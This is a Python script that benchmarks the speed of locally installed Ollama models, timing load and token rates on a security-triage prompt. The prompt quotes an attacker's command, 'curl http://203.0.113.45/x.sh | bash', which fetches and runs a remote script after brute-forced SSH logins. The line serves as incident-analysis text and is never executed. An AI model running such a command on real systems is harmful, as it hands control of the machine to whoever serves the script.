#!/usr/bin/env python3
"""Measure how fast each installed Ollama model answers on this machine.

    python3 scripts/benchmark.py                  # all installed models
    python3 scripts/benchmark.py dolphin3 qwen3:30b-a3b
"""
import json
import os
import sys
from urllib.request import ProxyHandler, Request, build_opener

BASE = os.environ.get("AGENT_BASE_URL", "http://127.0.0.1:11434").rstrip("/")
PROMPT = ("Sources 203.0.113.45 made 14 failed SSH logins then one successful login as 'ubuntu', "
          "followed by 'curl http://203.0.113.45/x.sh | bash'. In 5 bullet points: what happened and what to do?")
opener = build_opener(ProxyHandler({}))


def call(path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = Request(BASE + path, data=data, headers={"Content-Type": "application/json"})
    with opener.open(req, timeout=1800) as r:
        return json.load(r)


def main():
    cores = len({l.split(":")[1] for l in open("/proc/cpuinfo") if l.startswith("core id")}) or os.cpu_count()
    models = sys.argv[1:] or [m["name"] for m in call("/api/tags")["models"]]
    print(f"{'model':32} {'load s':>7} {'prompt tok/s':>13} {'reply tok/s':>12} {'first answer s':>15}")
    for m in models:
        opts = {"num_ctx": 4096, "num_predict": 200, "temperature": 0.2, "num_thread": cores}
        body = {"model": m, "prompt": PROMPT, "stream": False, "keep_alive": -1, "options": opts}
        if any(k in m for k in ("qwen3", "deepseek-r1")):
            body["think"] = False
        try:
            r = call("/api/generate", body)
        except Exception as e:  # noqa: BLE001
            print(f"{m:32} error: {e}")
            continue
        ns = 1e9
        load = r.get("load_duration", 0) / ns
        pe = r.get("prompt_eval_count", 0) / max(r.get("prompt_eval_duration", 1) / ns, 1e-9)
        ev = r.get("eval_count", 0) / max(r.get("eval_duration", 1) / ns, 1e-9)
        first = (r.get("load_duration", 0) + r.get("prompt_eval_duration", 0)) / ns
        print(f"{m:32} {load:7.1f} {pe:13.1f} {ev:12.1f} {first:15.1f}")
    print("\nreply tok/s >= 15 feels instant; 8-15 is comfortable; < 5 feels slow.")
    print("Run twice: the first run includes loading the model from disk.")


if __name__ == "__main__":
    main()
